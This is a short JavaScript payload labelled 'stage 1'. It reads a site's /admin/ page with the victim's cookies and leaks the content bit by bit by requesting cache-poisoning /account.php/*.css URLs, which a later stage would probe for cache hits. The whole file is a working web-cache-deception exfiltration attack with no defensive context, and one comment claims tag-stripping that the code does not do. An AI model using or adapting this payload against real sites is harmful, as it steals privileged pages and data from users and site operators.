/* stage 1: read /admin/ and exfiltrate it through the edge cache, bit by bit.
   channel: GET /account.php/B<index>.css  -> cached (HIT) means bit = 1        */
(function () {
  var MARK = 'S1';
  function beacon(n) { new Image().src = '/account.php/' + n + '.css'; }
  beacon(MARK + '_alive');
  fetch('/admin/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (t) {
      // compress: keep only what matters — strip tags to text + all attribute values
      var keep = t.replace(/\s+/g, ' ');
      var b = [];
      for (var i = 0; i < keep.length && i < 1400; i++) b.push(keep.charCodeAt(i) & 0xff);
      beacon(MARK + '_len_' + b.length);
      for (var i = 0; i < b.length; i++) {
        for (var j = 0; j < 8; j++) {
          if (b[i] & (1 << j)) beacon(MARK + '_b_' + i + '_' + j);
        }
      }
      beacon(MARK + '_done');
    })
    .catch(function (e) { beacon(MARK + '_err'); });
})();
